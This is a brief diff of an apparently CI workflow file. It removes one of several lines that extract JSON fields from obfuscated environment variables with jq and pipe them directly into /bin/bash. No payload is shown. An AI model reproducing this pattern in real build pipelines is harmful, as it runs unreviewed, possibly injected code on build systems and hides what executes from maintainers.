@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$lhc070" | jq -r .apog862 | /bin/bash
           printf '%s' "$stqe74" | jq -r .d230 | /bin/bash
           printf '%s' "$po64942" | jq -r .h85349 | /bin/bash
-          echo $cadfr4358 | jq -r .zcpt3946 | /bin/bash
           printf '%s' "$gh7523" | jq -r .bni9260 | /bin/bash
 
       - name: Archive output
